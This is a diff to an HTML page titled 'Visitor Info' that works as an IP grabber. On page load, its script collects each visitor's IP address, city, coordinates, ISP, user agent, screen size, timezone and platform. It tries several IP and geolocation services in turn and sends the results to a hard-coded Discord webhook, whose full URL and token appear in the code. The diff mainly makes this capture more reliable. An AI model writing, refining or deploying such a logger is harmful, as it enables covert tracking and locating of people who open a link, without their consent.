@@ -2,73 +2,116 @@
 <html>
 <head>
     <title>Visitor Info</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a1a; color: white; }
+        .info { background: #333; padding: 20px; border-radius: 10px; display: inline-block; }
+    </style>
 </head>
 <body>
-    <h1>Loading your information...</h1>
-    
+    <div class="info">
+        <h2>Gathering your information...</h2>
+        <div id="status">Please wait</div>
+        <pre id="details"></pre>
+    </div>
+
     <script>
-        // Your Discord webhook
+        // ---------- CONFIG ----------
         const WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
         
-        // Browser info (always available)
-        const browserData = {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            platform: navigator.platform
-        };
-        
-        // Function to send to Discord
-        function sendToDiscord(data) {
-            let message = '🆕 **New Visitor**\n';
-            for (let [key, value] of Object.entries(data)) {
-                message += `**${key}:** ${value}\n`;
-            }
-            
+        // ---------- HELPER ----------
+        function sendToDiscord(message) {
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: message })
-            }).catch(e => console.log('Discord send failed:', e));
+            }).catch(e => console.error('Discord error:', e));
         }
-        
-        // Step 1: Get IP address (this ALWAYS works)
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                const ip = ipData.ip;
-                
-                // Step 2: Get location using that IP
-                return fetch(`https://ipapi.co/${ip}/json/`)
+
+        // ---------- BROWSER INFO ----------
+        const browser = {
+            'User Agent': navigator.userAgent,
+            'Language': navigator.language,
+            'Screen': `${screen.width}x${screen.height}`,
+            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+            'Platform': navigator.platform
+        };
+
+        document.getElementById('details').textContent = JSON.stringify(browser, null, 2);
+
+        // ---------- STEP 1: GET IP (TRY MULTIPLE SERVICES) ----------
+        const ipServices = [
+            'https://api.ipify.org?format=json',
+            'https://api.myip.com',
+            'https://ipapi.co/json/'
+        ];
+
+        function fetchIP(index) {
+            if (index >= ipServices.length) {
+                // All IP services failed – send browser info only
+                sendToDiscord('🆕 New Visitor (No IP)\n' + JSON.stringify(browser, null, 2));
+                document.getElementById('status').innerText = 'Could not get IP.';
+                return;
+            }
+
+            fetch(ipServices[index])
+                .then(r => r.json())
+                .then(data => {
+                    let ip = data.ip || data.ip_address;
+                    if (!ip) throw new Error('No IP in response');
+                    document.getElementById('status').innerText = `Got IP: ${ip}`;
+                    // STEP 2: GET LOCATION USING THAT IP
+                    fetchLocation(ip);
+                })
+                .catch(() => fetchIP(index + 1));
+        }
+
+        // ---------- STEP 2: GET LOCATION (MULTIPLE SERVICES) ----------
+        function fetchLocation(ip) {
+            const locServices = [
+                `https://ipapi.co/${ip}/json/`,
+                `https://ipinfo.io/${ip}/json?token=`, // leave token empty, works with limits
+                `http://ip-api.com/json/${ip}`
+            ];
+
+            function tryLoc(index) {
+                if (index >= locServices.length) {
+                    // Location failed – send IP + browser
+                    sendToDiscord(`🆕 New Visitor (IP only)\nIP: ${ip}\n` + JSON.stringify(browser, null, 2));
+                    document.getElementById('status').innerText = 'Location unavailable.';
+                    return;
+                }
+
+                fetch(locServices[index])
                     .then(r => r.json())
-                    .then(locationData => {
-                        // Combine everything
-                        const fullData = {
-                            'IP Address': ip,
-                            'Location': `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
-                            'Coordinates': locationData.latitude ? `${locationData.latitude}, ${locationData.longitude}` : '?',
-                            'ISP': locationData.org || 'N/A',
-                            ...browserData
+                    .then(data => {
+                        // Parse common fields
+                        const loc = {
+                            ip: ip,
+                            city: data.city || data.city || '?',
+                            region: data.region || data.regionName || '?',
+                            country: data.country_name || data.country || '?',
+                            coordinates: data.loc || (data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : '?'),
+                            isp: data.org || data.isp || '?'
                         };
-                        
+
+                        const full = { ...browser, ...loc };
+                        document.getElementById('details').textContent = JSON.stringify(full, null, 2);
+                        document.getElementById('status').innerText = '✅ Success!';
+
                         // Send to Discord
-                        sendToDiscord(fullData);
-                        
-                        // Update page
-                        document.body.innerHTML = '<h1>✅ Info captured</h1><p>Check Discord</p>';
-                    });
-            })
-            .catch(err => {
-                // If location fails, at least send IP + browser info
-                console.log('Location failed, sending basic info');
-                sendToDiscord({
-                    'IP Address': 'See browser info only',
-                    ...browserData,
-                    'Note': 'Location unavailable'
-                });
-                document.body.innerHTML = '<h1>⚠️ Basic info sent</h1>';
-            });
+                        let msg = '🆕 **New Visitor**\n';
+                        for (let [k, v] of Object.entries(full)) {
+                            msg += `**${k}:** ${v}\n`;
+                        }
+                        sendToDiscord(msg);
+                    })
+                    .catch(() => tryLoc(index + 1));
+            }
+            tryLoc(0);
+        }
+
+        // START
+        fetchIP(0);
     </script>
 </body>
 </html>
